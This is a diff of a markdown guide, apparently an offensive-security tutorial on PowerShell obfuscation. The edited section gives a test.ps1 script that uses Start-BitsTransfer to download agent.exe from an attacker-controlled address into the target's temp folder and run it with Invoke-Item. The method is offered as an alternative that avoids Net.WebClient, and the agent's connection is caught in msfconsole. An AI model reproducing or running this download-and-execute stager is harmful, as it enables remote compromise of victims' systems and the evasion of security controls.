@@ -592,25 +592,26 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      TODO: [ BitsTransfer ]
+      [ BitsTransfer ]
       Another way to download/execute remotelly our agent without using the powershell switch
       (Net.WebClient).DownloadFile method. This method also allow us to chose the download
       location of the agent in target system and start the agent (exe).
+
+      HINT: powershell gives us access to windows environment variables using the $env: switch
 
 <br />
 
 - File **test.ps1** (trigger download/execution)
 
       Import-Module BitsTransfer
-      $path = [environment]::getfolderpath("temp")
-      Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$path\agent.exe"
-      Invoke-Item "$path\agent.exe" #<-- trigger agent execution
+      Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$env:tmp\\agent.exe"
+      Invoke-Item "$env:tmp\\agent.exe" #<-- trigger agent execution
 
-![powershell obfuscation test.ps1](http://i.)
+![powershell obfuscation test.ps1](http://i.cubeupload.com/Wa81qT.jpg)
 
-- Recibing the connection in msfconsole 
+- Execution of **agent.exe** in target system (auto-exec)
 
-![powershell obfuscation msfconsole](http://i.)
+![powershell obfuscation msfconsole](http://i.cubeupload.com/CYNBc6.jpg)
 
 ---
 
